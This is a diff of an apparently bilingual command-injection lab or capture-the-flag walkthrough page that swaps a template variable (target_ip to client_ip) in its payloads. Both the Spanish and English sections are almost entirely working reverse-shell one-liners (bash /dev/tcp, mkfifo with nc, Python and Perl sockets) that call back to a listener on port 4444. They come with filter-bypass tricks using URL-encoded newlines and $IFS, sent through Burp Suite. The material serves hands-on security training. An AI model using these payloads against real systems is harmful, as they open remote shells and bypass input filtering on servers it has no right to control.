@@ -80,30 +80,30 @@
 
     <h3>Easy — Bash TCP reverse shell</h3>
     <p>Sin filtrado. Cualquier separador funciona.</p>
-    <pre>; bash -i &gt;&amp; /dev/tcp/{{ target_ip }}/4444 0&gt;&amp;1</pre>
+    <pre>; bash -i &gt;&amp; /dev/tcp/{{ client_ip }}/4444 0&gt;&amp;1</pre>
     <p>Alternativas con otros separadores:</p>
-    <pre>| bash -i &gt;&amp; /dev/tcp/{{ target_ip }}/4444 0&gt;&amp;1
-&amp;&amp; bash -i &gt;&amp; /dev/tcp/{{ target_ip }}/4444 0&gt;&amp;1</pre>
+    <pre>| bash -i &gt;&amp; /dev/tcp/{{ client_ip }}/4444 0&gt;&amp;1
+&amp;&amp; bash -i &gt;&amp; /dev/tcp/{{ client_ip }}/4444 0&gt;&amp;1</pre>
     <p>Si bash no está disponible, usar <code>sh</code>:</p>
-    <pre>; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2&gt;&amp;1 | nc {{ target_ip }} 4444 &gt; /tmp/f</pre>
+    <pre>; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2&gt;&amp;1 | nc {{ client_ip }} 4444 &gt; /tmp/f</pre>
 
     <h3>Medium — Newline bypass (<code>%0a</code>)</h3>
     <p>Filtra <code>;</code> y <code>|</code>. Usa <code>&&</code> o el newline URL-encoded via Burp Suite.</p>
     <pre># Con &&
-https://example.com &amp;&amp; bash -i &gt;&amp; /dev/tcp/{{ target_ip }}/4444 0&gt;&amp;1
+https://example.com &amp;&amp; bash -i &gt;&amp; /dev/tcp/{{ client_ip }}/4444 0&gt;&amp;1
 
 # Con newline (intercepta en Burp Repeater y pon %0a en el body):
-url=https://example.com%0abash -i &gt;&amp; /dev/tcp/{{ target_ip }}/4444 0&gt;&amp;1</pre>
+url=https://example.com%0abash -i &gt;&amp; /dev/tcp/{{ client_ip }}/4444 0&gt;&amp;1</pre>
     <p>Python como alternativa (sin redirectores <code>&gt;</code>):</p>
-    <pre>https://x &amp;&amp; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("{{ target_ip }}",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(["/bin/sh"])'</pre>
+    <pre>https://x &amp;&amp; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("{{ client_ip }}",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(["/bin/sh"])'</pre>
 
     <h3>Hard — Python/Perl one-liner + <code>$IFS</code></h3>
     <p>Filtra <code>; | &amp;&amp; &gt; &lt; &amp; `</code>. El truco: Python no necesita redirectores de shell para la reverse shell.
     Usa <code>%0a</code> (newline) para separar comandos y <code>$IFS</code> si necesitas espacios sin metacaracteres.</p>
     <pre># En Burp Suite, envía en el body (el %0a es un newline literal):
-url=https://x%0apython3${IFS}-c${IFS}'import socket,subprocess,os;s=socket.socket();s.connect(("{{ target_ip }}",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(["/bin/sh"])'</pre>
+url=https://x%0apython3${IFS}-c${IFS}'import socket,subprocess,os;s=socket.socket();s.connect(("{{ client_ip }}",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(["/bin/sh"])'</pre>
     <p>Alternativa con Perl:</p>
-    <pre>url=https://x%0aperl${IFS}-e${IFS}'use Socket;$i="{{ target_ip }}";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");'</pre>
+    <pre>url=https://x%0aperl${IFS}-e${IFS}'use Socket;$i="{{ client_ip }}";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");'</pre>
 
     <h3>Estabilizar la shell</h3>
     <p>Una vez dentro, la shell es dumb (sin TTY). Para mejorarla:</p>
@@ -152,30 +152,30 @@ cat /root/root.txt</pre>
 
     <h3>Easy — Bash TCP reverse shell</h3>
     <p>No filtering. Any separator works.</p>
-    <pre>; bash -i &gt;&amp; /dev/tcp/{{ target_ip }}/4444 0&gt;&amp;1</pre>
+    <pre>; bash -i &gt;&amp; /dev/tcp/{{ client_ip }}/4444 0&gt;&amp;1</pre>
     <p>Alternatives with other separators:</p>
-    <pre>| bash -i &gt;&amp; /dev/tcp/{{ target_ip }}/4444 0&gt;&amp;1
-&amp;&amp; bash -i &gt;&amp; /dev/tcp/{{ target_ip }}/4444 0&gt;&amp;1</pre>
+    <pre>| bash -i &gt;&amp; /dev/tcp/{{ client_ip }}/4444 0&gt;&amp;1
+&amp;&amp; bash -i &gt;&amp; /dev/tcp/{{ client_ip }}/4444 0&gt;&amp;1</pre>
     <p>If bash is not available, use <code>sh</code>:</p>
-    <pre>; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2&gt;&amp;1 | nc {{ target_ip }} 4444 &gt; /tmp/f</pre>
+    <pre>; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2&gt;&amp;1 | nc {{ client_ip }} 4444 &gt; /tmp/f</pre>
 
     <h3>Medium — Newline bypass (<code>%0a</code>)</h3>
     <p>Filters <code>;</code> and <code>|</code>. Use <code>&&</code> or URL-encoded newline via Burp Suite.</p>
     <pre># With &&
-https://example.com &amp;&amp; bash -i &gt;&amp; /dev/tcp/{{ target_ip }}/4444 0&gt;&amp;1
+https://example.com &amp;&amp; bash -i &gt;&amp; /dev/tcp/{{ client_ip }}/4444 0&gt;&amp;1
 
 # With newline (intercept in Burp Repeater and put %0a in the body):
-url=https://example.com%0abash -i &gt;&amp; /dev/tcp/{{ target_ip }}/4444 0&gt;&amp;1</pre>
+url=https://example.com%0abash -i &gt;&amp; /dev/tcp/{{ client_ip }}/4444 0&gt;&amp;1</pre>
     <p>Python as an alternative (no <code>&gt;</code> redirectors):</p>
-    <pre>https://x &amp;&amp; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("{{ target_ip }}",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(["/bin/sh"])'</pre>
+    <pre>https://x &amp;&amp; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("{{ client_ip }}",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(["/bin/sh"])'</pre>
 
     <h3>Hard — Python/Perl one-liner + <code>$IFS</code></h3>
     <p>Filters <code>; | &amp;&amp; &gt; &lt; &amp; `</code>. The trick: Python does not need shell redirectors for a reverse shell.
     Use <code>%0a</code> (newline) to separate commands and <code>$IFS</code> if you need spaces without metacharacters.</p>
     <pre># In Burp Suite, send in body (%0a is a literal newline):
-url=https://x%0apython3${IFS}-c${IFS}'import socket,subprocess,os;s=socket.socket();s.connect(("{{ target_ip }}",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(["/bin/sh"])'</pre>
+url=https://x%0apython3${IFS}-c${IFS}'import socket,subprocess,os;s=socket.socket();s.connect(("{{ client_ip }}",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(["/bin/sh"])'</pre>
     <p>Perl alternative:</p>
-    <pre>url=https://x%0aperl${IFS}-e${IFS}'use Socket;$i="{{ target_ip }}";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");'</pre>
+    <pre>url=https://x%0aperl${IFS}-e${IFS}'use Socket;$i="{{ client_ip }}";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");'</pre>
 
     <h3>Shell stabilization</h3>
     <p>Once inside, the shell is dumb (no TTY). To upgrade it:</p>
